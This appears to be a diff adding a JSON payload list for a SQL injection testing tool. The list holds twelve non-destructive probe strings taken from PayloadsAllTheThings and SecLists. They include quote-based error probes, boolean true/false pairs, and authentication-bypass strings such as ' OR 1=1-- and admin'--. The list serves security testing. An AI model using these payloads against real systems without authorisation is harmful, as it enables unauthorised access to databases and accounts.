@@ -1,0 +1,98 @@
+[
+  {
+    "name": "single_quote",
+    "value": "'",
+    "kind": "syntax",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/README.md — entry-point/error detection"
+  },
+  {
+    "name": "or_true_comment",
+    "value": "' OR 1=1--",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — boolean/authentication-bypass testing"
+  },
+  {
+    "name": "or_true_comment_spaced",
+    "value": "' OR 1=1-- ",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — boolean/authentication-bypass testing with required comment space"
+  },
+  {
+    "name": "or_true_comment_paren",
+    "value": "' OR 1=1--)",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — parenthesized boolean/authentication-bypass testing"
+  },
+  {
+    "name": "double_quote",
+    "value": "\"",
+    "kind": "syntax",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/README.md — entry-point/error detection"
+  },
+  {
+    "name": "encoded_quote",
+    "value": "%27",
+    "kind": "syntax",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection/README.md — entry-point/error detection"
+  },
+  {
+    "name": "numeric_true",
+    "value": "1 AND 1=1",
+    "kind": "differential",
+    "destructive": false,
+    "source": "SecLists + PayloadsAllTheThings methodology",
+    "upstream_reference": "SQL injection boolean/differential testing"
+  },
+  {
+    "name": "numeric_false",
+    "value": "1 AND 1=2",
+    "kind": "differential",
+    "destructive": false,
+    "source": "SecLists + PayloadsAllTheThings methodology",
+    "upstream_reference": "SQL injection boolean/differential testing"
+  },
+  {
+    "name": "string_true",
+    "value": "' AND '1'='1",
+    "kind": "differential",
+    "destructive": false,
+    "source": "SecLists + PayloadsAllTheThings methodology",
+    "upstream_reference": "SQL injection boolean/differential testing"
+  },
+  {
+    "name": "string_false",
+    "value": "' AND '1'='2",
+    "kind": "differential",
+    "destructive": false,
+    "source": "SecLists + PayloadsAllTheThings methodology",
+    "upstream_reference": "SQL injection boolean/differential testing"
+  },
+  {
+    "name": "or_true_quoted",
+    "value": "' OR '1'='1",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — tautology authentication-bypass testing"
+  },
+  {
+    "name": "admin_comment_bypass",
+    "value": "admin'--",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — comment-based authentication-bypass testing"
+  }
+]
